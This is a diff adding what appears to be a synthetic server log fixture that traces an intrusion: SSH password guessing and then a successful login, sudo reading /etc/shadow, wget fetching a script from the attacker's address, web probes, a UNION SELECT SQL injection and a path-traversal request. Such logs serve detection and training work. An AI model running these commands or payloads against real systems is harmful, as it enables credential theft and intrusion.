@@ -1,0 +1,25 @@
+Oct 10 13:55:01 web sshd[1201]: Failed password for root from 203.0.113.9 port 50122 ssh2
+Oct 10 13:55:03 web sshd[1202]: Failed password for root from 203.0.113.9 port 50124 ssh2
+Oct 10 13:55:05 web sshd[1203]: Failed password for admin from 203.0.113.9 port 50126 ssh2
+Oct 10 13:55:07 web sshd[1204]: Failed password for invalid user test from 203.0.113.9 port 50128 ssh2
+Oct 10 13:55:09 web sshd[1205]: Failed password for ubuntu from 203.0.113.9 port 50130 ssh2
+Oct 10 13:55:11 web sshd[1206]: Failed password for ubuntu from 203.0.113.9 port 50132 ssh2
+Oct 10 13:55:20 web sshd[1210]: Accepted password for ubuntu from 203.0.113.9 port 50140 ssh2
+Oct 10 13:55:21 web sshd[1210]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Oct 10 13:56:00 web sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct 10 13:56:30 web sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.9/x.sh
+192.0.2.55 - - [10/Oct/2023:13:57:01 +0000] "GET /wp-login.php HTTP/1.1" 404 209 "-" "curl/8.0"
+192.0.2.55 - - [10/Oct/2023:13:57:02 +0000] "GET /.env HTTP/1.1" 404 209 "-" "curl/8.0"
+192.0.2.55 - - [10/Oct/2023:13:57:03 +0000] "GET /admin/ HTTP/1.1" 403 209 "-" "curl/8.0"
+192.0.2.55 - - [10/Oct/2023:13:57:04 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 209 "-" "curl/8.0"
+198.51.100.7 - - [10/Oct/2023:13:58:00 +0000] "GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 5123 "-" "sqlmap/1.7"
+198.51.100.7 - - [10/Oct/2023:13:58:05 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1820 "-" "sqlmap/1.7"
+Oct 10 14:00:00 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40001 DPT=22
+Oct 10 14:00:01 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40002 DPT=23
+Oct 10 14:00:02 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40003 DPT=80
+Oct 10 14:00:03 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40004 DPT=443
+Oct 10 14:00:04 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40005 DPT=3389
+Oct 10 14:00:05 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40006 DPT=3306
+Oct 10 14:00:06 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40007 DPT=5432
+Oct 10 14:00:07 fw kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.0.0.5 PROTO=TCP SPT=40008 DPT=8080
+Oct 10 14:02:11 web sshd[1301]: Accepted publickey for deploy from 10.0.0.42 port 51999 ssh2
